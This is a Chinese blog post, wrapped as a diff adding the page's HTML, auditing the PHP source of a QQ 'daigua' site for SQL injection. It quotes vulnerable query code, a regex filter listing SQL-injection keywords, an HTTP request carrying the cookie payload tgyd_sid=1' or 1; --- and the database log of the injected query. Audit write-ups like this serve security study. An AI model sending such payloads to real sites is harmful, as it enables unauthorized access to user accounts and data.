@@ -1,0 +1,394 @@
+<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  
+  
+  <title>  PHP - 简单代码审计 |   Hello! I am DXkite </title>
+
+ 
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+
+  <link rel="stylesheet" href="/nayo.min.css"> 
+</head>  
+  <body>   
+    
+      <header class="header">
+	
+  <nav class="header-nav">        
+   
+    <span class="iconfont icon-menu mobile-toggle"></span>   	
+
+    <div class="header-menu">          
+              
+            
+
+              <a class="header-menu-link" id="header-menu-home" href="/">首页</a>     
+
+            
+            
+            
+
+              <a class="header-menu-link" id="header-menu-archives" href="/archives">归档</a>     
+
+            
+            
+            
+
+              <a class="header-menu-link" id="header-menu-tags" href="/tags">标签</a>     
+
+            
+            
+            
+
+              <a class="header-menu-link" id="header-menu-about" href="/about">关于</a>     
+
+            
+            
+            
+
+              <a class="iconfont icon-menu-search header-menu-link" id="header-menu-search"></a>
+
+            
+                
+    </div>  
+    
+  </nav>
+</header>   
+
+      <div class="container">       
+          
+          
+            <section class="main">  
+          
+
+          <article class="post">
+  
+	<div class="post-header">
+
+	<p class="post-title">	
+		PHP - 简单代码审计
+	</p>
+			
+
+	<div class="meta-info">	
+	<span>
+		7月 18, 2018
+	</span>
+
+	
+	
+		<i class="iconfont icon-words"></i>
+		<span>
+			3394
+		</span>
+	
+</div>
+
+</div> 
+	 
+
+	  <div class="post-content slideDownMin">
+
+		
+
+			
+					<p>翻网盘的时候翻到了一堆 <code>代挂网站源码</code> ，大概是以前和别人合作的时候别人给的参考网站，现在对其中部分代码进行一次简单的代码审计，本次主要审计外部变量造成的SQL注入，运行环境版本为 <code>PHP5</code><br><a id="more"></a><br>程序代码给出下载：</p>
+<p><a href="天高云淡V2免授权版1.20.7z">天高云淡V2免授权版1.20.7z</a></p>
+<h2 id="PHP的外部变量"><a href="#PHP的外部变量" class="headerlink" title="PHP的外部变量"></a>PHP的外部变量</h2><table>
+<thead>
+<tr>
+<th>变量名</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>$_SERVER</td>
+<td>记录服务器信息</td>
+</tr>
+<tr>
+<td>$_POST</td>
+<td>记录请求表单</td>
+</tr>
+<tr>
+<td>$_GET</td>
+<td>记录请求GET参数</td>
+</tr>
+<tr>
+<td>$_COOKIE</td>
+<td>记录请求的Cookies</td>
+</tr>
+</tbody>
+</table>
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>一般来说，对于源代码中的外部变量遵循一个铁则：</p>
+<blockquote>
+<p>永远不要相信用户的输入</p>
+</blockquote>
+<p>本次利用 <code>NotePad++</code> 对代码进行搜索并分析上下文来确定是否包含SQL注入。</p>
+<p><em>搜索变量</em></p>
+<p><img src="1.png" alt=""></p>
+<h2 id="审计过程"><a href="#审计过程" class="headerlink" title="审计过程"></a>审计过程</h2><p>一般来说，比较简单的PHP网站，一个PHP文件一个页面，没有使用框架，就基本上不会对外部变量进行过滤，从代码来看，代码的作者至少有3位：</p>
+<p><strong>转义函数</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safestr</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!get_magic_quotes_gpc())&#123;</span><br><span class="line">		<span class="keyword">return</span> addslashes($str);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> $str;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p><code>addslashes</code>() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
+<p>预定义字符是：</p>
+<ul>
+<li>单引号（’）</li>
+<li>双引号（”）</li>
+<li>反斜杠（\）</li>
+<li>NULL</li>
+</ul>
+<p>默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 <code>addslashes</code>()，因为这样会导致双层转义。遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。</p>
+<p>可以看到这里对输入的字符串进行一次过滤，使用的地方如：</p>
+<blockquote>
+<p>/find.php:1~6<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'includes/common.php'</span>);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'do'</span>]==<span class="string">'find'</span>)&#123;</span><br><span class="line">	session_start();</span><br><span class="line">	$user=safestr($_POST[<span class="string">'user'</span>]);</span><br><span class="line">	$aqanswer=safestr($_POST[<span class="string">'aqanswer'</span>]);</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p>但是也有未使用的地方（此管理目录，虽然有注入点，但是需要管理员权限才可运行）：</p>
+<blockquote>
+<p>/admin/addfz.php:13~15<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$d_qq = $_POST[<span class="string">'d_qq'</span>];</span><br><span class="line">$d_user_name = $_POST[<span class="string">'d_user_name'</span>];</span><br><span class="line">$d_user_pwd = $_POST[<span class="string">'d_user_pwd'</span>];</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p><strong>安全检测</strong></p>
+<p>此份代码里包含了安全检测部分，检测输入变量是否包含恶意字符：</p>
+<blockquote>
+<p>/includes/360_safe3.php</p>
+</blockquote>
+<p><em>部分代码</em></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">$getfilter=<span class="string">"'|(and|or)\\b.+?(&gt;|&lt;|=|in|like)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">$postfilter=<span class="string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">$cookiefilter=<span class="string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">	StopAttack($key,$value,$getfilter);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">	StopAttack($key,$value,$postfilter);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_COOKIE <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">	StopAttack($key,$value,$cookiefilter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="审计结果"><a href="#审计结果" class="headerlink" title="审计结果"></a>审计结果</h2><p>从代码静态审计来看，注入点比较多，例如：</p>
+<blockquote>
+<p>/mgmt/qd.php:17 注入参数： POST:uin<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$qq=$_POST[<span class="string">'uin'</span>];</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (!$qqrow=$db-&gt;get_row(<span class="string">"select * from &#123;$prefix&#125;qqs where qq='$qq' and uid='$userrow[uid]' limit 1"</span>)) &#123;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<h3 id="可用注入"><a href="#可用注入" class="headerlink" title="可用注入"></a>可用注入</h3><blockquote>
+<p>/includes/common.php:77 注入参数：COOKIE:tgyd_sid <strong>可用</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$cookiesid = $_COOKIE[<span class="string">'tgyd_sid'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($cookiesid &amp;&amp; $userrow = $db-&gt;get_row(<span class="string">"select * from &#123;$prefix&#125;users where sid ='$cookiesid' limit 1"</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    C(<span class="string">'loginuser'</span>, $userrow[<span class="string">'user'</span>]);</span><br><span class="line"></span><br><span class="line">    C(<span class="string">'loginuid'</span>, $userrow[<span class="string">'uid'</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<h3 id="POST-实列"><a href="#POST-实列" class="headerlink" title="POST 实列"></a>POST 实列</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET http://qq.atd3.org/includes/common.php HTTP/1.1</span><br><span class="line">Host: qq.atd3.org</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie:tgyd_sid=1&apos; or 1%3B --- </span><br><span class="line">X-Forwarded-For: 222.222.112.1</span><br></pre></td></tr></table></figure>
+<h3 id="注入日志"><a href="#注入日志" class="headerlink" title="注入日志"></a>注入日志</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">180718 12:32:12	   16 Connect	root@localhost on </span><br><span class="line">		   16 Init DB	qq_tgyd</span><br><span class="line">		   16 Query	set names utf8</span><br><span class="line">		   16 Query	select * from tgyd_separate where urls=&apos;qq.atd3.org&apos; limit 1</span><br><span class="line">		   16 Query	select * from tgyd_webconfigs</span><br><span class="line">		   16 Query	select * from tgyd_users where sid =&apos;1&apos; or 1; ---&apos; limit 1</span><br><span class="line">		   16 Quit</span><br></pre></td></tr></table></figure>  	
+					
+	  </div>     
+	  
+
+	
+<div class="post-meta">
+      
+        <i class="iconfont icon-category"></i>       
+        <a class="category-link" href="/categories/技术分享/">技术分享</a> 	
+     
+      	
+
+      
+        <i class="iconfont icon-tag"></i>     
+          <a class="tag-link" href="/tags/Code-Audit/">Code Audit</a> <a class="tag-link" href="/tags/PHP/">PHP</a> <a class="tag-link" href="/tags/Web/">Web</a> <a class="tag-link" href="/tags/网络安全/">网络安全</a>    
+      	
+</div>
+
+
+
+
+
+<div class="post-footer">
+  <div class="pf-left">
+      <img class="pf-avatar" src="/dxkite.png">
+      <p class="pf-des">Hello! I am DXkite</p>
+  </div>
+
+  <div class="pf-right">           
+      <div class="pf-links">
+        
+
+
+
+
+<span class="donate-btn">
+	<span class="iconfont icon-donate"></span>
+</span>
+
+
+<div id="donate-box" class="sildeUpMin">
+
+	<span class="donate-cancel iconfont icon-cancel"></span>
+
+	<div class="donate-img-box">
+		<img id="donate-qr-wechat" class="noLazyLoad donate-img" src="/images/donate1.png" alt="No Donate Image!">	
+		<img id="donate-qr-alipay" class="noLazyLoad donate-img" src="/images/donate2.png" alt="No Donate Image!">	
+	</div>
+
+	<span class="donate-word">世界美好 你也是</span>
+
+	<div class="donate-list">
+		<span class="iconfont icon-donate-wechat"></span>
+		<span class="iconfont icon-donate-alipay"></span>
+	</div>
+
+</div>
+
+ 
+        
+	
+<script id="-mob-share" src="http://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></script>
+	
+	<span class="share-btn">
+	<span class="iconfont icon-share"></span>
+	</span>
+
+
+	<div class="-mob-share sildeUpMin">
+		   			             
+            <a class="iconfont  icon-share-qq -mob-share-qq"></a>		
+     	   			             
+            <a class="iconfont  icon-share-weixin -mob-share-weixin"></a>		
+     	   			             
+            <a class="iconfont  icon-share-weibo -mob-share-weibo"></a>		
+     	   			             
+            <a class="iconfont  icon-share-douban -mob-share-douban"></a>		
+     	   			             
+            <a class="iconfont  icon-share-facebook -mob-share-facebook"></a>		
+     	   			             
+            <a class="iconfont  icon-share-twitter -mob-share-twitter"></a>		
+     	   			             
+            <a class="iconfont  icon-share-google -mob-share-google"></a>		
+     	   
+	</div>	
+
+      </div>  
+    <nav class="pf-paginator">
+      
+         
+          <a href="/2018/07/19/php-function-default-behavior/" data-hover="PHP函数的默认行为">上一篇</a>      
+            
+        
+      
+        
+        <a href="/2018/07/14/snake-level/" data-hover="10 贪吃蛇 - 游戏关卡"> 下一篇</a>
+            
+  </nav>   
+  </div>
+</div> 
+	
+
+
+    
+    <div id="disqus_thread"></div>
+
+    <script>
+    (function() { 
+    var d = document, s = d.createElement('script');
+    s.src = 'https://'+'lemonreds'+'.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());    
+    (d.head || d.body).appendChild(s);
+    })();
+    </script>
+
+    <noscript>Please enable JavaScript to view the  <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+    </noscript>
+
+
+	
+</article>
+
+          </section> 
+      </div>            
+    
+    <a id="backTop">
+      <span>
+        <i class="iconfont icon-backtotop"></i>
+      </span>
+    </a> 
+
+  
+    
+    <div class="search-container sildeUpMin">
+        <div class="search-header">
+            <input type="text" placeholder="输入你想搜索的" id="search-input" class="search-input">  
+            <span class="search-cancel iconfont icon-cancel"></span>
+        </div>
+        <div id="search-result" class="search-result"></div>
+    </div>
+ 
+     <div class="mobile-menu">      
+
+      
+      <img class="mobile-menu-icon" src="/favicon.png">   
+      
+
+         
+            
+
+            <a class="mobile-menu-link" href="/">首页
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/archives">归档
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/tags">标签
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/about">关于
+            </a>
+            
+         
+                          
+
+            <a class="mobile-menu-link mobile-menu-search" href="#">搜索 </a>                 
+            
+         
+      
+</div>        
+    
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d7aee75a7326ba3e59244e2db26823c8"; 
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+
+
+     
+    
+
+
+
+
+<footer id="footer">	    
+
+		
+		<div class="footer-copyright">
+		&copy;
+		
+		2018		
+	
+		DXkite
+		<br>
+
+		Theme By
+		<a href="https://github.com/Lemonreds/hexo-theme-Nayo" target="_blank">Nayo</a>	
+		</div>			
+	 
+</footer>   
+
+  
+
+    <script src="/nayo.bundle.js"></script>           
+  </body>        
+</html>
